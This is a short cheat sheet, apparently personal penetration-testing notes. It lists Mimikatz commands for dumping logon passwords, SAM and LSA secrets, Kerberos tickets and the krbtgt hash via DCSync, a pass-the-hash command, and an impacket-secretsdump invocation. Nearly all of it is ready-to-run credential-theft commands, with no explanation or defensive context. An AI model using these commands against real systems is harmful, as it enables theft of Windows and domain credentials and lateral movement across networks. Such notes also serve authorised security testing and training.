# Mimikatz

```powewrshell
.\mimikatz.exe "log .\mimikatz.log" "privilege::debug" "sekurlsa::logonpasswords" "exit" #oneliner
privilege::debug

token::whoami
token::elevate

lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
sekurlsa::logonpasswords
sekurlsa::tickets

lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM
```

## Pass The Hash
```powershell
mimikatz # sekurlsa::pth /user:username /domain:domain.tld /ntlm:ntlm_hash
```

# Credential Access with Secretsdump

```bash
impacket-secretsdump username@target-ip -dc-ip target-ip [-hashes]
```






